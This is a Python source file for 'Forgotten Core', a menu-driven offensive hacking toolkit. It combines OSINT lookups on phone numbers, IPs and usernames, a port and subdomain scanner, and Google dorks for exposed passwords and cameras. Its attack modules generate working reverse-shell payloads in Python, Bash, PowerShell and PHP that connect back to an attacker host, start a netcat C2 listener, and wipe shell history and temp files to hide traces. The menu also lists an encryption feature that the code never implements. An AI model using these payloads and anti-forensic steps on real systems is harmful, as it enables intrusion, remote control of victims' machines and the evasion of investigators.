#!/usr/bin/env python3
import os
import sys
import time
import hashlib
import subprocess
import socket
import base64
import random
import string
import re
import json
from datetime import datetime
import requests

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    DARK = '\033[90m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    END = '\033[0m'

class ForgottenCore:
    def __init__(self):
        self.version = "2.0"
        self.codename = "Echoes of the Void"
        self.user = "forgotten"
        self.host = "void"
        self.void_dir = os.path.expanduser("~/.forgotten_core")
        self.payload_dir = f"{self.void_dir}/payloads"
        self.osint_dir = f"{self.void_dir}/osint"
        self.scan_dir = f"{self.void_dir}/scans"
        for d in [self.void_dir, self.payload_dir, self.osint_dir, self.scan_dir]:
            os.makedirs(d, exist_ok=True)
    
    def get_path(self):
        p = os.getcwd().replace(os.path.expanduser("~"), "~")
        return p
    
    def prompt(self):
        path = self.get_path()
        return f"{Colors.RED}{Colors.BOLD}┌──({Colors.GREEN}{self.user}@{Colors.CYAN}{self.host}{Colors.RED})-{Colors.BLUE}[{path}]{Colors.RED}\n└─{Colors.WHITE}${Colors.END} "
    
    def clear_screen(self):
        os.system("clear")
        self.banner()
    
    def banner(self):
        banner = f"""
{Colors.RED}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════════════════╗
║  ███████╗ ██████╗ ██████╗  ██████╗ ████████╗████████╗███████╗███╗   ██╗    ║
║  ██╔════╝██╔═══██╗██╔══██╗██╔═══██╗╚══██╔══╝╚══██╔══╝██╔════╝████╗  ██║    ║
║  █████╗  ██║   ██║██████╔╝██║   ██║   ██║      ██║   █████╗  ██╔██╗ ██║    ║
║  ██╔══╝  ██║   ██║██╔══██╗██║   ██║   ██║      ██║   ██╔══╝  ██║╚██╗██║    ║
║  ██║     ╚██████╔╝██║  ██║╚██████╔╝   ██║      ██║   ███████╗██║ ╚████║    ║
║  ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═══╝    ║
║                         ██████╗ ██████╗ ██████╗ ███████╗                 ║
║                        ██╔════╝██╔═══██╗██╔══██╗██╔════╝                 ║
║                        ██║     ██║   ██║██████╔╝█████╗                   ║
║                        ██║     ██║   ██║██╔══██╗██╔══╝                   ║
║                        ╚██████╗╚██████╔╝██║  ██║███████╗                 ║
║                         ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝                 ║
╚═══════════════════════════════════════════════════════════════════════════╝
{Colors.END}
{Colors.PURPLE}{Colors.BOLD}                    FORGOTTEN CORE v{self.version} - {self.codename}{Colors.END}
{Colors.DARK}{Colors.DIM}               "What is buried shall remain buried. What is forgotten shall rise."{Colors.END}
        """
        print(banner)
    
    def show_menu(self):
        menu = f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════════════════╗
║                         MAIN MENU                                                 ║
╠═══════════════════════════════════════════════════════════════════════════╣{Colors.END}

{Colors.GREEN}[01]{Colors.WHITE} phone / tel    {Colors.DARK}» Phone number OSINT{Colors.END}
{Colors.GREEN}[02]{Colors.WHITE} ip / geo       {Colors.DARK}» IP geolocation tracker{Colors.END}
{Colors.GREEN}[03]{Colors.WHITE} username / user{Colors.DARK}» Check username on social media{Colors.END}
{Colors.GREEN}[04]{Colors.WHITE} subdomain / sub{Colors.DARK}» Subdomain scanner{Colors.END}
{Colors.GREEN}[05]{Colors.WHITE} port / scan    {Colors.DARK}» Fast TCP port scanner{Colors.END}
{Colors.GREEN}[06]{Colors.WHITE} dork / google  {Colors.DARK}» Google dork generator{Colors.END}
{Colors.GREEN}[07]{Colors.WHITE} email / mail   {Colors.DARK}» Email OSINT lookup{Colors.END}
{Colors.GREEN}[08]{Colors.WHITE} whois          {Colors.DARK}» WHOIS domain lookup{Colors.END}
{Colors.GREEN}[09]{Colors.WHITE} dns            {Colors.DARK}» DNS records lookup{Colors.END}
{Colors.GREEN}[10]{Colors.WHITE} payload / p    {Colors.DARK}» Generate reverse shell payload{Colors.END}
{Colors.GREEN}[11]{Colors.WHITE} c2 / server    {Colors.DARK}» Start C2 / listener server{Colors.END}
{Colors.GREEN}[12]{Colors.WHITE} stealth / s    {Colors.DARK}» Clean traces and logs{Colors.END}
{Colors.GREEN}[13]{Colors.WHITE} anon / a       {Colors.DARK}» Anonymity (Tor network){Colors.END}
{Colors.GREEN}[14]{Colors.WHITE} crypt / encrypt{Colors.DARK}» AES file encryption/decryption{Colors.END}
{Colors.GREEN}[15]{Colors.WHITE} hash           {Colors.DARK}» Hash generator{Colors.END}
{Colors.GREEN}[16]{Colors.WHITE} encode         {Colors.DARK}» Base64/URL encoder decoder{Colors.END}
{Colors.GREEN}[17]{Colors.WHITE} passgen / pg   {Colors.DARK}» Random password generator{Colors.END}
{Colors.GREEN}[18]{Colors.WHITE} clear / cls    {Colors.DARK}» Clear screen{Colors.END}
{Colors.GREEN}[19]{Colors.WHITE} help / ?       {Colors.DARK}» Show this menu{Colors.END}
{Colors.GREEN}[00]{Colors.WHITE} exit / quit    {Colors.DARK}» Exit Forgotten Core{Colors.END}

{Colors.RED}{Colors.BOLD}╚═══════════════════════════════════════════════════════════════════════════╝{Colors.END}
        """
        print(menu)
    
    # ==================== OSINT MODULES ====================
    
    def phone_osint(self):
        print(f"\n{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗")
        print(f"║                    PHONE OSINT MODULE                                ║")
        print(f"╚═══════════════════════════════════════════════════════════════╝{Colors.END}\n")
        
        raw = input(f"{self.prompt()}phone number > ").strip()
        clean = re.sub(r'[^0-9+]', '', raw)
        
        if clean.startswith('0'): num = '+62' + clean[1:]
        elif clean.startswith('62') and not clean.startswith('+'): num = '+' + clean
        elif not clean.startswith('+'): num = '+62' + clean
        else: num = clean
        
        prefixes = {
            '811':'Telkomsel','812':'Telkomsel','813':'Telkomsel','814':'Indosat','815':'Indosat',
            '816':'Indosat','817':'XL Axiata','818':'XL Axiata','819':'XL Axiata','821':'Telkomsel',
            '822':'Telkomsel','823':'Telkomsel','831':'Axis','832':'Axis','833':'Axis','838':'Axis',
            '852':'Telkomsel','853':'Telkomsel','878':'XL Axiata','896':'Tri','897':'Tri','898':'Tri','899':'Tri'
        }
        
        part = num.replace('+62', '')
        pref = part[:3] if len(part) >= 3 else part
        
        print(f"\n{Colors.GREEN}{'='*55}{Colors.END}")
        print(f"{Colors.BOLD}📱 PHONE OSINT RESULTS{Colors.END}")
        print(f"{Colors.GREEN}{'='*55}{Colors.END}\n")
        print(f"{Colors.CYAN}Number     :{Colors.WHITE} {num}")
        print(f"{Colors.CYAN}Clean      :{Colors.WHITE} +62{part}")
        if pref in prefixes:
            print(f"{Colors.CYAN}Carrier    :{Colors.GREEN} {prefixes[pref]}{Colors.END}")
        print(f"{Colors.CYAN}Length     :{Colors.WHITE} {len(part)} digits")
        
        print(f"\n{Colors.YELLOW}[*] OSINT Links:{Colors.END}")
        print(f"    WhatsApp  : https://wa.me/{num}")
        print(f"    Telegram  : https://t.me/+{num[1:]}")
        print(f"    Google    : https://www.google.com/search?q={num}")
        
        filename = f"{self.osint_dir}/phone_{num.replace('+','')}.txt"
        with open(filename, 'w') as f:
            f.write(f"Phone: {num}\nCarrier: {prefixes.get(pref, 'Unknown')}\nTime: {datetime.now()}\n")
        print(f"\n{Colors.GREEN}[+] Saved to: {filename}{Colors.END}")
    
    def ip_tracker(self):
        print(f"\n{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗")
        print(f"║                    IP TRACKER MODULE                                 ║")
        print(f"╚═══════════════════════════════════════════════════════════════╝{Colors.END}\n")
        
        target = input(f"{self.prompt()}IP address > ")
        
        try:
            r = requests.get(f"http://ip-api.com/json/{target}", timeout=10)
            data = r.json()
            if data.get('status') == 'success':
                print(f"\n{Colors.GREEN}{'='*55}{Colors.END}")
                print(f"{Colors.BOLD}🌍 IP GEOLOCATION RESULTS{Colors.END}")
                print(f"{Colors.GREEN}{'='*55}{Colors.END}\n")
                print(f"{Colors.CYAN}IP Address :{Colors.WHITE} {data.get('query')}")
                print(f"{Colors.CYAN}Country    :{Colors.WHITE} {data.get('country')} ({data.get('countryCode')})")
                print(f"{Colors.CYAN}Region     :{Colors.WHITE} {data.get('regionName')}")
                print(f"{Colors.CYAN}City       :{Colors.WHITE} {data.get('city')}")
                print(f"{Colors.CYAN}ZIP        :{Colors.WHITE} {data.get('zip')}")
                print(f"{Colors.CYAN}Coordinates:{Colors.WHITE} {data.get('lat')}, {data.get('lon')}")
                print(f"{Colors.CYAN}ISP        :{Colors.WHITE} {data.get('isp')}")
                print(f"{Colors.CYAN}Organization:{Colors.WHITE} {data.get('org')}")
                print(f"\n{Colors.YELLOW}[*] Google Maps: https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}{Colors.END}")
                
                filename = f"{self.osint_dir}/ip_{target}.txt"
                with open(filename, 'w') as f:
                    f.write(json.dumps(data, indent=2))
                print(f"\n{Colors.GREEN}[+] Saved to: {filename}{Colors.END}")
            else:
                print(f"{Colors.RED}[!] IP not found{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
    
    def username_check(self):
        print(f"\n{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗")
        print(f"║                    USERNAME OSINT MODULE                             ║")
        print(f"╚═══════════════════════════════════════════════════════════════╝{Colors.END}\n")
        
        username = input(f"{self.prompt()}username > ")
        
        sites = {
            "Instagram": f"https://instagram.com/{username}",
            "Twitter": f"https://twitter.com/{username}",
            "GitHub": f"https://github.com/{username}",
            "Reddit": f"https://reddit.com/user/{username}",
            "TikTok": f"https://tiktok.com/@{username}",
            "YouTube": f"https://youtube.com/@{username}",
            "Telegram": f"https://t.me/{username}",
            "Facebook": f"https://facebook.com/{username}"
        }
        
        print(f"\n{Colors.CYAN}[*] Checking username: {username}{Colors.END}\n")
        
        found = []
        for site, url in sites.items():
            try:
                r = requests.get(url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
                if r.status_code == 200:
                    print(f"{Colors.GREEN}[✓] {site}: {url}{Colors.END}")
                    found.append(site)
                else:
                    print(f"{Colors.DARK}[✗] {site}: not found{Colors.END}")
            except:
                print(f"{Colors.DARK}[?] {site}: error{Colors.END}")
            time.sleep(0.2)
        
        filename = f"{self.osint_dir}/username_{username}.txt"
        with open(filename, 'w') as f:
            f.write(f"Username: {username}\nFound on: {', '.join(found)}\nTime: {datetime.now()}\n")
        print(f"\n{Colors.GREEN}[+] Found {len(found)} profiles. Saved to: {filename}{Colors.END}")
    
    def subdomain_scan(self):
        print(f"\n{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗")
        print(f"║                    SUBDOMAIN SCANNER                                 ║")
        print(f"╚═══════════════════════════════════════════════════════════════╝{Colors.END}\n")
        
        domain = input(f"{self.prompt()}domain > ")
        
        subdomains = [
            "www", "mail", "ftp", "blog", "dev", "test", "admin", "api", "app",
            "portal", "login", "dashboard", "cdn", "assets", "static", "docs",
            "support", "help", "status", "info", "news", "shop", "store"
        ]
        
        print(f"{Colors.CYAN}[*] Scanning {domain}{Colors.END}\n")
        
        found = []
        for sub in subdomains:
            test = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(test)
                print(f"{Colors.GREEN}[✓] {test} -> {ip}{Colors.END}")
                found.append(test)
            except:
                print(f"{Colors.DARK}[✗] {test}{Colors.END}")
            time.sleep(0.05)
        
        filename = f"{self.scan_dir}/subdomains_{domain}.txt"
        with open(filename, 'w') as f:
            f.write(f"Domain: {domain}\nFound: {', '.join(found)}\nTime: {datetime.now()}\n")
        print(f"\n{Colors.GREEN}[+] Found {len(found)} subdomains. Saved to: {filename}{Colors.END}")
    
    def port_scanner(self):
        print(f"\n{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗")
        print(f"║                    PORT SCANNER MODULE                               ║")
        print(f"╚═══════════════════════════════════════════════════════════════╝{Colors.END}\n")
        
        target = input(f"{self.prompt()}target IP/Domain > ")
        ports_input = input(f"{self.prompt()}ports (1-1000 or 80,443) > ") or "1-1000"
        
        if '-' in ports_input:
            start, end = map(int, ports_input.split('-'))
            port_range = range(start, end+1)
        else:
            port_range = [int(p.strip()) for p in ports_input.split(',')]
        
        print(f"\n{Colors.CYAN}[*] Scanning {target}...{Colors.END}\n")
        
        open_ports = []
        total = len(port_range)
        count = 0
        
        for port in port_range:
            count += 1
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            if sock.connect_ex((target, port)) == 0:
                print(f"{Colors.GREEN}[+] Port {port}: OPEN{Colors.END}")
                open_ports.append(port)
            sock.close()
            
            if count % 100 == 0:
                print(f"{Colors.DARK}[*] Progress: {count}/{total}{Colors.END}")
        
        filename = f"{self.scan_dir}/ports_{target}.txt"
        with open(filename, 'w') as f:
            f.write(f"Target: {target}\nOpen ports: {open_ports}\nTime: {datetime.now()}\n")
        print(f"\n{Colors.GREEN}[+] Found {len(open_ports)} open ports. Saved to: {filename}{Colors.END}")
    
    def dork_generator(self):
        print(f"\n{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗")
        print(f"║                    GOOGLE DORK GENERATOR                             ║")
        print(f"╚═══════════════════════════════════════════════════════════════╝{Colors.END}\n")
        
        dorks = {
            '1': ('Login Pages', ['inurl:login', 'inurl:admin', 'inurl:wp-admin', 'intitle:"login page"']),
            '2': ('Sensitive Files', ['ext:conf', 'ext:config', 'ext:sql', 'ext:db', 'ext:bak']),
            '3': ('Exposed Data', ['inurl:phpinfo.php', 'intitle:"index of"', 'inurl:dump.sql']),
            '4': ('Passwords', ['ext:passwd', 'ext:pwd', 'intext:"password" filetype:txt']),
            '5': ('Cameras', ['inurl:view/view.shtml', 'inurl:axis-cgi/jpg', 'intitle:"Live View"'])
        }
        
        print(f"{Colors.CYAN}Categories:{Colors.END}")
        for key, (name, _) in dorks.items():
            print(f"{Colors.GREEN}[{key}]{Colors.WHITE} {name}{Colors.END}")
        print(f"{Colors.GREEN}[0]{Colors.WHITE} Custom dork{Colors.END}")
        
        choice = input(self.prompt())
        
        if choice == '0':
            dork = input(f"{self.prompt()}custom dork > ")
            print(f"\n{Colors.GREEN}[+] https://www.google.com/search?q={dork.replace(' ', '+')}{Colors.END}")
        elif choice in dorks:
            name, dork_list = dorks[choice]
            print(f"\n{Colors.GREEN}[+] {name} Dorks:{Colors.END}")
            for dork in dork_list:
                print(f"{Colors.CYAN}    {dork}{Colors.END}")
                print(f"    https://www.google.com/search?q={dork.replace(' ', '+')}\n")
        
        filename = f"{self.osint_dir}/dorks.txt"
        with open(filename, 'w') as f:
            f.write(f"Dorks generated at {datetime.now()}\n")
            for key, (name, dork_list) in dorks.items():
                f.write(f"\n=== {name} ===\n")
                for dork in dork_list:
                    f.write(f"{dork}\n")
        print(f"{Colors.GREEN}[+] Saved to: {filename}{Colors.END}")
    
    # ==================== ATTACK MODULES ====================
    
    def generate_payload(self):
        print(f"\n{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗")
        print(f"║                    PAYLOAD GENERATOR                                  ║")
        print(f"╚═══════════════════════════════════════════════════════════════╝{Colors.END}\n")
        
        print(f"{Colors.GREEN}[1]{Colors.WHITE} Python Reverse Shell")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} Bash Reverse Shell")
        print(f"{Colors.GREEN}[3]{Colors.WHITE} PowerShell Reverse Shell")
        print(f"{Colors.GREEN}[4]{Colors.WHITE} PHP Reverse Shell")
        choice = input(self.prompt())
        
        lhost = input(f"{self.prompt()}LHOST > ")
        lport = input(f"{self.prompt()}LPORT > ")
        
        payloads = {
            '1': f"""import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])""",
            '2': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            '3': f"""$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()""",
            '4': f"""<?php
set_time_limit(0);
$ip='{lhost}';
$port={lport};
$fp=fsockopen($ip,$port,$errno,$errstr);
if(!$fp){{die();}}
while(!feof($fp)){{
    $cmd=fgets($fp,1024);
    $output=shell_exec($cmd);
    fwrite($fp,$output);
}}
fclose($fp);
?>"""
        }
        
        ext = {'1':'py', '2':'sh', '3':'ps1', '4':'php'}
        lang = {'1':'Python', '2':'Bash', '3':'PowerShell', '4':'PHP'}
        
        payload = payloads.get(choice, payloads['1'])
        filename = f"{self.payload_dir}/payload_{lang[choice]}_{int(time.time())}.{ext[choice]}"
        
        with open(filename, 'w') as f:
            f.write(payload)
        
        os.chmod(filename, 0o755)
        
        print(f"\n{Colors.GREEN}{'='*55}{Colors.END}")
        print(f"{Colors.BOLD}[+] PAYLOAD GENERATED SUCCESSFULLY{Colors.END}")
        print(f"{Colors.GREEN}{'='*55}{Colors.END}\n")
        print(f"{Colors.CYAN}File     :{Colors.WHITE} {filename}")
        print(f"{Colors.CYAN}Type     :{Colors.WHITE} {lang[choice]} Reverse Shell")
        print(f"{Colors.CYAN}LHOST    :{Colors.WHITE} {lhost}")
        print(f"{Colors.CYAN}LPORT    :{Colors.WHITE} {lport}")
        print(f"\n{Colors.YELLOW}[*] Run on target:{Colors.END}")
        if choice == '1':
            print(f"    python3 {filename}")
        elif choice == '2':
            print(f"    bash {filename}")
        elif choice == '3':
            print(f"    powershell -ExecutionPolicy Bypass -File {filename}")
        elif choice == '4':
            print(f"    php {filename}")
    
    def start_c2(self):
        print(f"\n{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗")
        print(f"║                    C2 / LISTENER SERVER                               ║")
        print(f"╚═══════════════════════════════════════════════════════════════╝{Colors.END}\n")
        
        print(f"{Colors.GREEN}[1]{Colors.WHITE} HTTP Server (python)")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} Netcat Listener")
        choice = input(self.prompt())
        
        if choice == '1':
            port = input(f"{self.prompt()}port (80) > ") or "80"
            print(f"\n{Colors.CYAN}[*] Starting HTTP server on port {port}{Colors.END}")
            os.system(f"python3 -m http.server {port}")
        elif choice == '2':
            port = input(f"{self.prompt()}port (4444) > ") or "4444"
            print(f"\n{Colors.CYAN}[*] Starting netcat listener on port {port}{Colors.END}")
            os.system(f"nc -lvnp {port}")
    
    def stealth_clean(self):
        print(f"\n{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗")
        print(f"║                    STEALTH CLEANER                                     ║")
        print(f"╚═══════════════════════════════════════════════════════════════╝{Colors.END}\n")
        
        print(f"{Colors.GREEN}[1]{Colors.WHITE} Wipe Bash/Zsh History")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} Clear Logs")
        print(f"{Colors.GREEN}[3]{Colors.WHITE} Full Forensic Cleanup")
        choice = input(self.prompt())
        
        if choice == '1':
            os.system("history -c")
            os.system("echo > ~/.bash_history")
            os.system("echo > ~/.zsh_history")
            print(f"\n{Colors.GREEN}[+] Shell history wiped{Colors.END}")
        elif choice == '2':
            os.system("rm -rf /tmp/* 2>/dev/null")
            os.system("find ~ -name '*.pyc' -delete 2>/dev/null")
            print(f"\n{Colors.GREEN}[+] Temp files and cache cleared{Colors.END}")
        elif choice == '3':
            os.system("history -c")
            os.system("echo > ~/.bash_history")
            os.system("rm -rf /tmp/* 2>/dev/null")
            os.system("find ~ -name '*.pyc' -delete 2>/dev/null")
            print(f"\n{Colors.GREEN}[+] Full forensic cleanup complete{Colors.END}")
    
    def anonymity(self):
        print(f"\n{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗")
        print(f"║                    VOID ANONYMITY                                      ║")
        print(f"║              \"Vanish without a trace\"                                 ║")
        print(f"╚═══════════════════════════════════════════════════════════════╝{Colors.END}\n")
        
        print(f"{Colors.GREEN}[1]{Colors.WHITE} Start Tor")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} Check Current IP")
        print(f"{Colors.GREEN}[3]{Colors.WHITE} Anonymized IP (Tor)")
        choice = input(self.prompt())
        
        if choice == '1':
            os.system("tor &")
            print(f"\n{Colors.GREEN}[+] Tor started on port 9050{Colors.END}")
        elif choice == '2':
            print(f"\n{Colors.CYAN}[*] Current IP:{Colors.END}")
            os.system("curl -s ifconfig.me")
            print()
        elif choice == '3':
            print(f"\n{Colors.CYAN}[*] Anonymized IP (Tor):{Colors.END}")
            os.system("proxychains4 curl -s ifconfig.me 2>/dev/null")
            print()
    
    # ==================== UTILITY MODULES ====================
    
    def hash_generator(self):
        print(f"\n{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗")
        print(f"║                    HASH GENERATOR                                     ║")
        print(f"╚═══════════════════════════════════════════════════════════════╝{Colors.END}\n")
        
        text = input(f"{self.prompt()}text to hash > ")
        
        print(f"\n{Colors.GREEN}[+] Hashes:{Colors.END}")
        print(f"    MD5    : {hashlib.md5(text.encode()).hexdigest()}")
        print(f"    SHA1   : {hashlib.sha1(text.encode()).hexdigest()}")
        print(f"    SHA256 : {hashlib.sha256(text.encode()).hexdigest()}")
        print(f"    SHA512 : {hashlib.sha512(text.encode()).hexdigest()}")
    
    def encode_decode(self):
        print(f"\n{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗")
        print(f"║                    ENCODE/DECODE MODULE                               ║")
        print(f"╚═══════════════════════════════════════════════════════════════╝{Colors.END}\n")
        
        print(f"{Colors.GREEN}[1]{Colors.WHITE} Base64 Encode")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} Base64 Decode")
        print(f"{Colors.GREEN}[3]{Colors.WHITE} URL Encode")
        print(f"{Colors.GREEN}[4]{Colors.WHITE} URL Decode")
        choice = input(self.prompt())
        
        text = input(f"{self.prompt()}text > ")
        
        if choice == '1':
            encoded = base64.b64encode(text.encode()).decode()
            print(f"\n{Colors.GREEN}[+] Base64: {encoded}{Colors.END}")
        elif choice == '2':
            try:
                decoded = base64.b64decode(text).decode()
                print(f"\n{Colors.GREEN}[+] Decoded: {decoded}{Colors.END}")
            except:
                print(f"\n{Colors.RED}[!] Invalid Base64{Colors.END}")
        elif choice == '3':
            encoded = requests.utils.quote(text)
            print(f"\n{Colors.GREEN}[+] URL Encoded: {encoded}{Colors.END}")
        elif choice == '4':
            decoded = requests.utils.unquote(text)
            print(f"\n{Colors.GREEN}[+] URL Decoded: {decoded}{Colors.END}")
    
    def password_generator(self):
        print(f"\n{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗")
        print(f"║                    PASSWORD GENERATOR                                 ║")
        print(f"╚═══════════════════════════════════════════════════════════════╝{Colors.END}\n")
        
        length = int(input(f"{self.prompt()}length (12) > ") or "12")
        count = int(input(f"{self.prompt()}count (5) > ") or "5")
        
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        
        print(f"\n{Colors.GREEN}[+] Generated passwords:{Colors.END}")
        for i in range(count):
            pwd = ''.join(random.choice(chars) for _ in range(length))
            print(f"    {i+1}. {pwd}")
        
        filename = f"{self.payload_dir}/passwords.txt"
        with open(filename, 'a') as f:
            f.write(f"\n--- {datetime.now()} ---\n")
            for i in range(count):
                f.write(f"{i+1}. {''.join(random.choice(chars) for _ in range(length))}\n")
        print(f"\n{Colors.GREEN}[+] Saved to: {filename}{Colors.END}")
    
    # ==================== MAIN LOOP ====================
    
    def run(self):
        self.clear_screen()
        
        while True:
            try:
                cmd = input(self.prompt()).strip().lower()
                
                if cmd in ['phone', 'tel']:
                    self.phone_osint()
                elif cmd in ['ip', 'geo']:
                    self.ip_tracker()
                elif cmd in ['username', 'user']:
                    self.username_check()
                elif cmd in ['subdomain', 'sub']:
                    self.subdomain_scan()
                elif cmd in ['port', 'scan']:
                    self.port_scanner()
                elif cmd in ['dork', 'google']:
                    self.dork_generator()
                elif cmd in ['payload', 'p']:
                    self.generate_payload()
                elif cmd in ['c2', 'server']:
                    self.start_c2()
                elif cmd in ['stealth', 's']:
                    self.stealth_clean()
                elif cmd in ['anon', 'a']:
                    self.anonymity()
                elif cmd in ['hash']:
                    self.hash_generator()
                elif cmd in ['encode']:
                    self.encode_decode()
                elif cmd in ['passgen', 'pg']:
                    self.password_generator()
                elif cmd in ['clear', 'cls']:
                    self.clear_screen()
                elif cmd in ['help', '?', 'menu']:
                    self.show_menu()
                elif cmd in ['exit', 'quit', 'q']:
                    print(f"\n{Colors.RED}[!] Returning to void...{Colors.END}")
                    sys.exit(0)
                elif cmd == '':
                    continue
                else:
                    print(f"{Colors.RED}[!] Unknown command: {cmd}. Type 'help' for available commands.{Colors.END}")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.RED}[!] Interrupted. Exiting...{Colors.END}")
                sys.exit(0)
            except Exception as e:
                print(f"{Colors.RED}[!] Error: {e}{Colors.END}")

if __name__ == "__main__":
    core = ForgottenCore()
    core.run()
